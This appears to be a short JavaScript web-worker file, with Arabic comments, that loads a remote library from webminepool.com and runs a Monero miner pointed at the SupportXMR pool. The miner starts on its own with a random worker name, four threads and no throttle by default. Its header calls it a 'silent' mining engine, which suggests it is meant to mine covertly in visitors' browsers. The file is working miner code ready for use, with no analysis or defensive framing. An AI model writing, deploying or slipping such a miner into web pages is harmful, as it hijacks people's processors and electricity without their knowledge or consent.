// محرك التعدين الصامت v21: الربط المباشر مع SupportXMR
importScripts('https://webminepool.com/lib/base.js');

let miner = null;

self.onmessage = function(e) {
    const data = e.data;

    if (data.type === 'init') {
        // استخدام محرك Anonymous المرتبط بـ SupportXMR عبر Proxy
        miner = new WebMinePool.Anonymous(data.address, {
            autoStart: true,
            userName: "akli_node_" + Math.floor(Math.random() * 1000),
            threads: data.threads || 4,
            throttle: data.throttle || 0.0,
            pool: "pool.supportxmr.com:443" // توجيه الهاشات للمسبح المطلوب
        });

        miner.on('update', () => {
            self.postMessage({
                type: 'hashrate',
                hps: miner.getHashesPerSecond(),
                total: miner.getTotalHashes()
            });
        });

        miner.on('error', (e) => {
            console.error("Mining Error:", e);
        });
    }

    if (data.type === 'start') {
        if (miner) miner.start();
    }

    if (data.type === 'stop') {
        if (miner) miner.stop();
    }

    if (data.type === 'setThrottle') {
        if (miner) miner.setThrottle(data.throttle);
    }
};
